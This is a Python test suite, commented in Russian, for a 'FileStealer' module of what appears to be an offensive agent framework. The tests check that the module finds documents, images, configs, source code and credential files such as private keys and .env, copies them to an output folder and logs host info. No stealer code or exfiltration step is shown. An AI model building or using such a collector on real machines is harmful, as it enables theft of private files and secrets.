#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Test module for FileStealer
"""

import os
import sys
import json
import shutil
import tempfile
import unittest
from unittest.mock import patch, MagicMock

# Добавляем корневую директорию в sys.path для корректного импорта модулей
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agent_modules.file_stealer import FileStealer

class TestFileStealer(unittest.TestCase):
    """Test cases for FileStealer module"""
    
    def setUp(self):
        """Set up the test environment"""
        # Создаем временную директорию для тестирования
        self.test_dir = tempfile.mkdtemp()
        self.output_dir = os.path.join(self.test_dir, "output")
        
        # Создаем тестовые файлы разных типов
        self.test_files = {}
        
        # Документы
        docs_dir = os.path.join(self.test_dir, "documents")
        os.makedirs(docs_dir, exist_ok=True)
        self.test_files["doc"] = os.path.join(docs_dir, "test_doc.docx")
        self.test_files["pdf"] = os.path.join(docs_dir, "test_pdf.pdf")
        self.test_files["txt"] = os.path.join(docs_dir, "test_text.txt")
        
        # Изображения
        img_dir = os.path.join(self.test_dir, "images")
        os.makedirs(img_dir, exist_ok=True)
        self.test_files["jpg"] = os.path.join(img_dir, "test_image.jpg")
        self.test_files["png"] = os.path.join(img_dir, "test_image.png")
        
        # Конфигурации
        config_dir = os.path.join(self.test_dir, "config")
        os.makedirs(config_dir, exist_ok=True)
        self.test_files["json"] = os.path.join(config_dir, "config.json")
        self.test_files["yaml"] = os.path.join(config_dir, "config.yaml")
        
        # Код
        code_dir = os.path.join(self.test_dir, "code")
        os.makedirs(code_dir, exist_ok=True)
        self.test_files["py"] = os.path.join(code_dir, "script.py")
        self.test_files["js"] = os.path.join(code_dir, "script.js")
        
        # Учетные данные
        creds_dir = os.path.join(self.test_dir, "credentials")
        os.makedirs(creds_dir, exist_ok=True)
        self.test_files["key"] = os.path.join(creds_dir, "private.key")
        self.test_files["env"] = os.path.join(creds_dir, ".env")
        
        # Создаем тестовые файлы с содержимым
        for file_path in self.test_files.values():
            with open(file_path, 'w') as f:
                f.write(f"This is a test file: {os.path.basename(file_path)}")
    
    def tearDown(self):
        """Clean up the test environment"""
        # Удаляем временную директорию и все созданные файлы
        shutil.rmtree(self.test_dir)
    
    @patch('agent_modules.environment_manager.EnvironmentManager')
    def test_initialization(self, mock_env_manager):
        """Test the initialization of FileStealer"""
        # Мокаем EnvironmentManager для тестирования
        mock_instance = mock_env_manager.return_value
        mock_instance.collect_system_info.return_value = {
            "os": "darwin",
            "hostname": "test-host"
        }
        
        # Инициализируем FileStealer
        stealer = FileStealer(output_dir=self.output_dir)
        
        # Проверяем, что FileStealer корректно инициализирован
        self.assertEqual(stealer.output_dir, self.output_dir)
        self.assertTrue(os.path.exists(self.output_dir))
        self.assertTrue(stealer.has_env_manager)
        self.assertEqual(stealer.sys_info["os"], "darwin")
        self.assertEqual(stealer.sys_info["hostname"], "test-host")
        
        # Проверяем наличие целевых расширений и локаций
        self.assertIn("documents", stealer.target_extensions)
        self.assertIn("images", stealer.target_extensions)
        self.assertIn("credentials", stealer.target_extensions)
        self.assertIsNotNone(stealer.target_locations)
    
    @patch('agent_modules.environment_manager.EnvironmentManager')
    def test_find_target_files(self, mock_env_manager):
        """Test finding target files"""
        # Мокаем EnvironmentManager
        mock_instance = mock_env_manager.return_value
        mock_instance.collect_system_info.return_value = {
            "os": "darwin",
            "hostname": "test-host"
        }
        
        # Инициализируем FileStealer и модифицируем целевые локации
        stealer = FileStealer(output_dir=self.output_dir)
        
        # Добавляем тестовую директорию в целевые локации
        stealer.target_locations = {"test_location": [self.test_dir]}
        
        # Выполняем поиск файлов
        found_files = stealer.find_target_files()
        
        # Проверяем результаты
        self.assertIsInstance(found_files, dict)
        self.assertIn("documents", found_files)
        self.assertIn("images", found_files)
        self.assertIn("configurations", found_files)
        self.assertIn("source_code", found_files)
        self.assertIn("credentials", found_files)
        
        # Проверяем, что найдены файлы каждого типа
        self.assertTrue(any(os.path.basename(f["path"]) == "test_doc.docx" for f in found_files["documents"]))
        self.assertTrue(any(os.path.basename(f["path"]) == "test_image.jpg" for f in found_files["images"]))
        self.assertTrue(any(os.path.basename(f["path"]) == "config.json" for f in found_files["configurations"]))
        self.assertTrue(any(os.path.basename(f["path"]) == "script.py" for f in found_files["source_code"]))
        self.assertTrue(any(os.path.basename(f["path"]) == "private.key" for f in found_files["credentials"]))
    
    @patch('agent_modules.environment_manager.EnvironmentManager')
    def test_extract_files(self, mock_env_manager):
        """Test extracting found files"""
        # Мокаем EnvironmentManager
        mock_instance = mock_env_manager.return_value
        mock_instance.collect_system_info.return_value = {
            "os": "darwin",
            "hostname": "test-host"
        }
        
        # Инициализируем FileStealer
        stealer = FileStealer(output_dir=self.output_dir)
        
        # Создаем тестовый набор найденных файлов
        found_files = {
            "documents": [
                {"name": "test_doc.docx", "path": self.test_files["doc"], "size": 100, "modified": "2023-01-01T12:00:00"}
            ],
            "images": [
                {"name": "test_image.jpg", "path": self.test_files["jpg"], "size": 200, "modified": "2023-01-01T12:00:00"}
            ],
            "credentials": [
                {"name": "private.key", "path": self.test_files["key"], "size": 50, "modified": "2023-01-01T12:00:00"}
            ]
        }
        
        # Выполняем извлечение файлов
        extracted_files = stealer.extract_files(found_files)
        
        # Проверяем результаты
        self.assertEqual(len(extracted_files), 3)
        
        # Проверяем, что файлы были скопированы в выходную директорию
        self.assertTrue(os.path.exists(os.path.join(self.output_dir, "documents", "test_doc.docx")))
        self.assertTrue(os.path.exists(os.path.join(self.output_dir, "images", "test_image.jpg")))
        self.assertTrue(os.path.exists(os.path.join(self.output_dir, "credentials", "private.key")))
    
    @patch('agent_modules.environment_manager.EnvironmentManager')
    def test_run(self, mock_env_manager):
        """Test the complete run of FileStealer"""
        # Мокаем EnvironmentManager
        mock_instance = mock_env_manager.return_value
        mock_instance.collect_system_info.return_value = {
            "os": "darwin",
            "hostname": "test-host"
        }
        
        # Инициализируем FileStealer и модифицируем целевые локации
        stealer = FileStealer(output_dir=self.output_dir)
        
        # Добавляем тестовую директорию в целевые локации
        stealer.target_locations = {"test_location": [self.test_dir]}
        
        # Выполняем полный цикл работы модуля
        result = stealer.run()
        
        # Проверяем результаты
        self.assertEqual(result["status"], "success")
        self.assertIsInstance(result["summary"], dict)
        self.assertGreater(result["summary"]["total_found"], 0)
        self.assertGreater(result["summary"]["total_extracted"], 0)
        self.assertEqual(result["summary"]["system"], "darwin")
        
        # Проверяем наличие выходного JSON-файла
        self.assertTrue(os.path.exists(result["output_file"]))
        
        # Проверяем содержимое JSON-файла
        with open(result["output_file"], 'r') as f:
            data = json.load(f)
            self.assertIn("total_found", data)
            self.assertIn("total_extracted", data)
            self.assertIn("found_files", data)

if __name__ == "__main__":
    unittest.main() 